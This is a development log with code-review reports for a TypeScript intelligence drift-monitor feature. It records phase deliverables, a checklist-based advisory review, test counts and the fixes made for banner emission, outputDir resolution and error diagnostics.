The Surgical Context Block in `coding-agent/SKILL.md` exactly matches the FR-5 template from the spec (paths, hotspot_score, cyclomatic_complexity, testGap, Implications — all present). NFR-5 (silent degradation when snapshot missing) is honoured: all skills wrap in null-check guards and omit the block entirely rather than emitting placeholder text.

**⚠️ Minor gap:** `new-track §2.0.5` loads the snapshot and passes it to the Architecture Committee agents, but does **not** emit the 3-state degradation banner to the user before spec generation. The spec says "surface banner to user" — this step is implicit but not explicitly wired in the skill text. Low severity (banner still gets emitted by `implement` preflight later), but it means users who only run `new-track` and never `implement` will miss drift warnings.

---

**2. DRY — ✅ CLEAN (with one artifact)**

`IntelligenceSnapshotReader.load()` is the single entry point across all 5 consumer skills (setup, new-track, implement, swarm-orchestrate, standalone-review, coding-agent). Zero drift-state computation is duplicated in any skill file — they all delegate to the reader.

`IntelligenceDriftMonitor.checkDrift()` is correctly separated into its own class and called internally by `SnapshotReader.load()`. No skill reaches into `DriftMonitor` directly.

**⚠️ Artifact:** The previous `snapshot-reader.ts` (pre-Phase-4 remediation) contained inline drift logic (`ageMinutes > 24 * 60`, manual `spawnSync` for `rev-list`, inline banner construction). This has been fully replaced in the current HEAD by delegation to `DriftMonitor`. The old inline logic is **gone** — confirmed by grepping the current file. DRY is clean as of HEAD.

---

**3. Architecture Quality — ✅ GOOD**

`IntelligenceDriftMonitor` is cleanly separated: it imports only `child_process`, takes a typed `Manifest` struct + `projectRoot` string, and returns a typed `DriftReport`. No filesystem access, no path resolution — pure computation. `IntelligenceSnapshotReader` owns all I/O (manifest read, hotspot/SAST/testGap JSON parsing) and delegates drift computation to `DriftMonitor`. This is the correct layering.

Skill integrations are additive-only. No existing skill logic is modified — Phase 4 prepends a new `## 0.5 Intelligence Preflight` section (implement), adds a new `### Surgical Context Block Injection` section (coding-agent), and injects a new bullet under an existing section (standalone-review §5.2, swarm-orchestrate §1.1, new-track §2.3). Skills remain independently executable with no cross-skill coupling — each calls `IntelligenceSnapshotReader.load()` via the shared library, not via each other.

**⚠️ Minor concern:** `IntelligenceSnapshotReader.load()` has a fallback `projectRoot` inference (`path.resolve(outputDir, '..', '..')`) when no root is provided. This heuristic is brittle if `outputDir` is configured to a non-standard location. Callers should always pass `projectRoot` explicitly. Not a blocker but Phase 5 should audit caller sites.

---

**4. Security Posture — ✅ CLEAN**

No `execSync` + string interpolation in any Phase 3 or Phase 4 code:
- `cli-update.ts` uses `execFileSync('git', ['rev-parse', ...])` (array form — safe)
- `incremental-updater.ts` uses `spawnSync` (remediated in Phase 3 via ADV-3)
- `snapshot-reader.ts` delegates to `DriftMonitor` which uses `spawnSync('git', ['rev-list', '--count', ...])` with array args — no interpolation
- `install-git-hook.sh` uses `git rev-parse --show-toplevel` in a here-doc (no user input injected into the variable expansion path)
- Path traversal guard in `cli-update.ts`: `resolvedRoot + path.sep` boundary check is correct (ADV-2 remediation confirmed)
- SHA validation in `DriftMonitor`: `/^[0-9a-f]{7,40}$/i` regex gate before passing SHA to `git rev-list` — injection-safe

---

**5. Completeness — ✅ ALL 6 PRESENT**

All 6 skills from the spec table are integrated:
- `setup` ✅ (§2.7: hook install + full scan)
- `implement` ✅ (§0.5 preflight)
- `swarm-orchestrate` ✅ (§1.1 TCS scoring)
- `standalone-review` ✅ (§5.2 crossCuttingRisk injection)
- `coding-agent` ✅ (Surgical Context Block)
- `new-track` ✅ (§2.0.5 + §2.3)

Tests present: `snapshot-reader.test.ts` (92 lines, NONE/LIVE/STALE states), `git-hook-integration.test.ts` (88 lines, round-trip assertion), `incremental-updater.test.ts` (spawnSync mock updated).

---

#### 🏆 Score: **8 / 10**

**Rationale:** Phases 3+4 deliver a well-architected, security-clean, spec-complete implementation. The `DriftMonitor`/`SnapshotReader` separation is textbook SRP, DRY is fully respected across all 6 skill consumers, and zero `execSync`+interpolation patterns exist anywhere in the diff. All 6 skills from FR-4 are integrated and the Surgical Context Block exactly matches the FR-5 template. The score is held from a 9 by two advisory-weight items: (1) `new-track §2.0.5` does not explicitly surface the degradation banner to the user before spec generation (spec says "surface banner to user" — omission is traceable), and (2) the `projectRoot` fallback inference in `SnapshotReader.load()` is a latent brittleness that will surface in non-standard `outputDir` configurations. Neither is a correctness or security defect; both are polish gaps.

---

#### 📌 Verdict

> **Phase 3+4: PASS.** Architecture is clean, security posture solid, all 6 skill integrations confirmed spec-compliant — two minor wiring gaps (banner surfacing in new-track, projectRoot inference) should be addressed in Phase 5 finalization.

---

#### 🔭 Systemic Patterns for Phase 5 to Monitor

1. **Banner surfacing contract:** Phase 5 (if any) should enforce that *every* `IntelligenceSnapshotReader.load()` call site emits the `driftBanner` to the user **before** executing its primary logic — not just as an internal variable. `new-track §2.0.5` and `setup §2.7` don't expose the banner string in their current prose; they describe loading but not displaying.

2. **Explicit `projectRoot` threading:** All 6 `load(outputDir)` call sites in skills should be updated to `load(outputDir, projectRoot)` once a canonical way to resolve `projectRoot` in skill context is established. The two-level fallback heuristic is a ticking brittleness bomb.

3. **`SwarmBlueprintGenerator` is still prose, not code:** The spec promises TCS scoring via `SwarmBlueprintGenerator` in `swarm-orchestrate`, but this class exists only as a skill-prose instruction, not as a TypeScript implementation. Phase 5 or a follow-on track should decide whether this becomes real code or remains agent-interpreted intent.


---

### [Phase 5] Drift Monitor & Observability
**Status:** Completed
**Commit:** `392132b`
**Test Count:** 165 passed / 165 total (0 failures, 22 test files)
**Branch:** `track/intelligence_incremental_20260724`

#### Deliverables

##### 1. `IntelligenceDriftMonitor` — `packages/superconductor-core/src/intelligence/drift-monitor.ts`
- Exports `Manifest`, `DriftReport`, and `IntelligenceDriftMonitor` class.
- `checkDrift(manifest, projectRoot)`: computes `commitsBehind` via `spawnSync('git', ['rev-list', '--count', '${sha}..HEAD'])`, never `execSync`. Invalid/missing SHA → `commitsBehind = Infinity`. All thresholds match spec: `isDrifted = commitsBehind > 10 || ageMs > 24h`; `recommendFullRescan = commitsBehind > 50 || ageMs > 7d || incrementalRuns >= 50`.
- `formatBanner(report)`: 3-state rendering (LIVE / STALE / STALE-with-rescan) with correct Unicode emojis (ℹ️ / ⚠️ / ❌).
- `noBanner()`: produces the NONE-state banner for callers that have no manifest.
- SHA validation via `/^[0-9a-f]{7,40}$/i` — short/invalid SHAs → `Infinity` without spawning git.

##### 2. `IntelligenceSnapshotReader` updated — `packages/superconductor-core/src/intelligence/snapshot-reader.ts`
- Delegates all drift computation to `IntelligenceDriftMonitor.checkDrift()`.
- Normalizes legacy manifest field names (`last_commit` / `incremental_runs`) alongside canonical (`lastCommitSha` / `incrementalRuns`) for backward compat.
- Returns `context.driftState`, `context.driftBanner`, `context.commitsBehind` from the `DriftReport`.
- Removed inline `spawnSync` call (now inside DriftMonitor — single responsibility).

##### 3. Index export — `packages/superconductor-core/src/intelligence/index.ts`
- Added `export * from './drift-monitor.js';`

##### 4. Tests — `packages/superconductor-core/tests/intelligence/drift-monitor.test.ts`
- 17 new tests across `checkDrift()`, `formatBanner()`, and `noBanner()`.
- Covers all 6 required scenarios: fresh manifest, 15 commits behind, `incrementalRuns=50`, 8-day-old snapshot, invalid SHA, missing SHA.
- All 3 banner formats validated (LIVE / STALE / NONE) including age unit formatting (minutes → hours → days).
- Asserts spawnSync is called with correct args array (not execSync).
- Asserts spawnSync is NOT called when SHA is missing/invalid.
- `child_process` fully mocked — no real git calls.

##### 5. `snapshot-reader.test.ts` updated
- Added `vi.mock('child_process')` and `spawnSync` default mock (0 commits behind) so tests run hermetically.
- STALE test now controls `spawnSync` to return `'15\n'`, confirming DriftMonitor integration path works end-to-end through the reader.

---

### [Review Phase 4] Advisory Review
**Auditor:** Swarm Reviewer (pipeline assembly-line)
**Timestamp:** 2026-07-24T03:42:00Z
**Commit reviewed:** `fe6fbce` — `feat(intelligence): universal skill integration with IntelligenceSnapshotReader and Surgical Context Block`

---

#### Checklist Results

| Check | Status | Notes |
|-------|--------|-------|
| `hotspotMap` loaded from `03_complexity.json` | ✅ PASS | L51: `path.join(outputDir, '03_complexity.json')` — correct index |
| `testGapMap` loaded from `07_test_gaps.json` | ✅ PASS | L80: `path.join(outputDir, '07_test_gaps.json')` — correct index |
| `sastFindings` loaded from `05_sast.json` | ✅ PASS | L67: `path.join(outputDir, '05_sast.json')` — correct index |
| `spawnSync` (not `execSync`) for `git rev-list --count` | ✅ PASS | `spawnSync('git', ['rev-list', '--count', ...])` — args array, no string interpolation |
| Returns `null` for NONE state (no manifest) | ✅ PASS | Early `return null; // NONE state` before any parsing |
| LIVE banner matches spec FR-6 format | ✅ PASS | `ℹ️  Intelligence: LIVE (snapshot age: ${ageMinutes}m · last commit: ${sha.slice(0,7)} · ${runs} incremental runs)` |
| STALE banner matches spec FR-6 format | ✅ PASS | `⚠️  Intelligence: STALE (snapshot age: ${ageString} · ${commitsBehind} commits behind · consider running /superconductor:setup)` |
| NONE banner emitted by skills | ⚠️ MISSING | `load()` returns `null` — no skill patch emits the `❌ Intelligence: NONE …` string. See ADVISORY-1. |
| `driftState` on returned `RepoContext` | ✅ PASS | Field declared + populated in both LIVE and STALE branches |
| `driftBanner` on returned `RepoContext` | ✅ PASS | Field declared + populated in both branches; Phase 5 can read it directly |
| No `execSync` + string interpolation in `snapshot-reader.ts` | ✅ PASS | Only `spawnSync` used; SHA passed as array arg |
| File indices not swapped (e.g., `04_coupling.json`) | ✅ PASS | All three paths use correct numbered filenames |
| Surgical Context Block scoped to task files only | ✅ PASS | "extract file paths mentioned in the task description"; "If a file does not appear in the snapshot, omit it" — no full-map leak |
| `implement/SKILL.md §0.5` Intelligence Preflight + stale trigger | ✅ PASS | `## 0.5 Intelligence Preflight` added; STALE branch triggers incremental update |
| `swarm-orchestrate/SKILL.md` Preflight before Wave 1, TCS boost rules | ✅ PASS | Block inserted before `## 1.1 SWARM ROLES`; TCS +2/TIER-4/security-panel rules present |
| `standalone-review/SKILL.md` SAST injection into security-reviewer | ✅ PASS | Injected under `### 5.2`; `LIVE SAST: <rule_id> at <file>` format specified |
| `coding-agent/SKILL.md` Surgical Context Block with hotspot+testGap+SAST | ✅ PASS | Block + template present; null-guard for NONE state explicit |
| `new-track/SKILL.md` `RepoContext` → Architecture Committee + Plan gen | ✅ PASS | Both Architecture Committee (§2.0) and Plan generation (§3) patched |
| Skill patches resolve `outputDir` via `getSuperconductorHome()` | ⚠️ MISSING | Skills call `load(outputDir)` without specifying resolution. See ADVISORY-2. |
| Malformed JSON returns null (not throw) | ✅ PASS | Entire parse block in `try { … } catch (e) { return null; }` |

---

#### Findings

##### 🔴 CRITICAL — None

No CRITICAL issues found in this commit.

---

##### 🟡 ADVISORY-1 — NONE state banner is caller-responsibility but undocumented

**Files:** `snapshot-reader.ts`, all 5 skill SKILL.md patches

Spec FR-6 mandates three banner strings. The LIVE and STALE banners are generated by `load()` and returned in `RepoContext.driftBanner`. The NONE banner (`❌  Intelligence: NONE (keyword heuristics active · run /superconductor:setup for surgical precision)`) is **not** produced by the reader — because `load()` returns `null`. Each skill must therefore emit this string when `load()` returns `null`, but none of the five skill patches include it or instruct agents to emit it.

**Risk:** AC-6 will fail if reviewers check NONE-state banner emission. Skills silently skip the banner on NONE (NFR-5 satisfied, FR-6 not).

**Fix options (pick one):**
- Add a static constant: `IntelligenceSnapshotReader.NONE_BANNER = '❌  Intelligence: NONE (keyword heuristics active · run /superconductor:setup for surgical precision)'`
- Or add to each skill patch: "If `load()` returns null, emit: `❌  Intelligence: NONE (keyword heuristics active · run /superconductor:setup for surgical precision)`"

**Severity:** Advisory — graceful degradation maintained, FR-6/AC-6 not fully satisfied.

---

##### 🟡 ADVISORY-2 — Skill patches call `load(outputDir)` without defining `outputDir` resolution

**Files:** All 5 patched SKILL.md files

The canonical resolution is `getSuperconductorHome()` (used in `cli-update.ts`). Skills call `IntelligenceSnapshotReader.load(outputDir)` without telling agents how to obtain `outputDir`. An agent following the skill text verbatim may use CWD, a hardcoded path, or nothing.

**Fix:** Add to each Intelligence Preflight/Context section:
```
Resolve: outputDir = getSuperconductorHome()
// ($SUPERCONDUCTOR_HOME env var, or ~/.superconductor as fallback)
```

**Severity:** Advisory — tests pass `tempDir` directly so no test failure; usability gap for agents.

---

##### 🟡 ADVISORY-3 — Inline `require('child_process')` inside static method

**File:** `snapshot-reader.ts`, line 30

```ts
const { spawnSync } = require('child_process');
```

File uses ES module `import` syntax at the top (`import * as fs from 'fs'`), making this `require()` stylistically inconsistent and ESM-incompatible if the package migrates to `"module": "ESNext"`.

**Fix:** Add `import { spawnSync } from 'child_process';` to top-level imports.

**Severity:** Advisory — no current breakage; pre-empts ESM migration failure.

---

##### 🟡 ADVISORY-4 — STALE age-string never emits days unit (`Nd`), spec example shows `2d`

**File:** `snapshot-reader.ts`, lines 42–43

Spec example: `snapshot age: 2d`. Implementation produces `48h` for a 2-day-old snapshot. The `ageString` logic only branches at `> 60m → Xh`, missing a `> 1440m → Xd` tier.

**Fix:**
```ts
const ageString = ageMinutes > 24 * 60
  ? `${Math.floor(ageMinutes / (60 * 24))}d`
  : ageMinutes > 60
    ? `${Math.floor(ageMinutes / 60)}h`
    : `${ageMinutes}m`;
```

**Severity:** Advisory — cosmetic; test passes because it uses `.toContain('Intelligence: STALE')` not the age unit.

---

##### 🟡 ADVISORY-5 — `spawnSync` `result.error` is silently swallowed

**File:** `snapshot-reader.ts`, lines 31–34

When `git` is absent (CI container without git), `result.status === null` and `result.error` is an `ENOENT` Error. The `if (result.status === 0 && result.stdout)` guard correctly falls through, leaving `commitsBehind = 0`. Behaviour is correct, but the error is swallowed with no diagnostic, making it hard to distinguish "git not found" from "0 commits behind."

**Fix:** Add: `if (result.error) { process.stderr.write('[superconductor] git rev-list failed: ' + result.error.message + '\n'); }`

**Severity:** Advisory — no correctness gap; diagnosability improvement only.

---

#### Summary

| Severity | Count |
|----------|-------|
| 🔴 CRITICAL | 0 |
| 🟠 HIGH | 0 |
| 🟡 ADVISORY | 5 |
| ✅ PASS (spec checks) | 16/20 (4 are the advisory misses above) |

**Verdict:** Phase 4 is **clear to proceed** to Phase 5 (Drift Monitor). All critical and correctness checks pass. Key Phase 5 readiness confirmed:
- `driftState` and `driftBanner` present on `RepoContext` ✅
- Correct file index mapping (03/05/07) ✅
- `spawnSync` throughout — no injection surface ✅
- Surgical Context Block properly scoped — no data leakage ✅
- Malformed JSON → `null` (NFR-5) ✅

**Top priority before phase close:** ADVISORY-1 (NONE banner gap in skills, risks AC-6 failure) and ADVISORY-2 (`outputDir` resolution undefined). Both are single-line fixes.

---

### [Phase 5] Oracle Advisory Response — 2026-07-24T03:46Z
**Commit:** `399065a`
**Responding to oracle advisory from 5f77a024 (timestamp: 2026-07-23T23:44:40Z)**

#### Advisory §1 — Banner surfacing contract ✅ RESOLVED
Added explicit JSDoc `## Required surfacing contract` block to `IntelligenceDriftMonitor.formatBanner()` and a call-site note to `noBanner()`. The docs now mandate:
- Every `load()` call site MUST emit the banner to the user (via `process.stderr.write`) **before** primary logic executes.
- `null` returns from `load()` MUST call `noBanner()` and emit it before falling back to keyword heuristics.
- Skills `new-track §2.0.5` and `setup §2.7` are named as responsible call sites.

#### Advisory §2 — `projectRoot` threading ✅ ALREADY IMPLEMENTED
`IntelligenceSnapshotReader.load(outputDir, projectRoot?)` already accepts `projectRoot` as an explicit second parameter (implemented in Phase 5 main commit `392132b`). The fallback `path.resolve(outputDir, '../..')` is only invoked when callers haven't threaded it through. JSDoc on `checkDrift()` now also warns that callers MUST pass projectRoot explicitly and documents the fallback as legacy-only.

#### Advisory §3 — `SwarmBlueprintGenerator` is prose-only ✅ NOTED
`swarm-orchestrate §1.1` references TCS scoring via `SwarmBlueprintGenerator`, but no TypeScript class exists. This is agent-interpreted intent (not a compiled module). No action taken in Phase 5 — this is deferred to `swarm_planner_20260724` which is the appropriate track for implementing it as a concrete artifact. The skill prose is intentionally declarative.

### [Remediation] Phase 4 Advisory Fixes

**Timestamp:** 2026-07-24T03:48:00+04:00
**Commit:** `6bd0332`
**Tests:** 165 passed (22 test files, 0 failures)

| Advisory | Status | Change |
|----------|--------|--------|
| ADV-1 (NONE banner not emitted) | ✅ FIXED | Added `NONE_BANNER` static to `IntelligenceSnapshotReader`; added null-guard instruction to all 5 skill files |
| ADV-2 (outputDir resolution undocumented) | ✅ FIXED | Added `getSuperconductorHome()` resolution step before `load()` in all 5 skill files |
| ADV-3 (inline `require('child_process')`) | ✅ N/A | No inline `require` found — `drift-monitor.ts` already uses ESM `import { spawnSync } from 'child_process'` at top level |
| ADV-4 (days unit missing from age string) | ✅ FIXED | LIVE banner now uses `_formatAge()` (which has days tier) instead of the old hours-only ternary |
| ADV-5 (spawnSync errors swallowed) | ✅ FIXED | Added `result.error` check with `process.stderr.write` after `spawnSync` call in `drift-monitor.ts` |

### [Final Oracle Remediation] Adversarial Findings

Status: **Completed**
- Reverted scope creep in `swarm-phase-gate.ts`
- Fixed `mergeIntoJson` silent data loss on JSON parse error
- Removed cached Vitest artifact and checked gitignore
- Marked all 19 plan tasks as complete
- Added degradation banner to `new-track/SKILL.md §2.0.5`
- Strengthened scoped-runner tests for file specificity
- Tests passing: 165/165
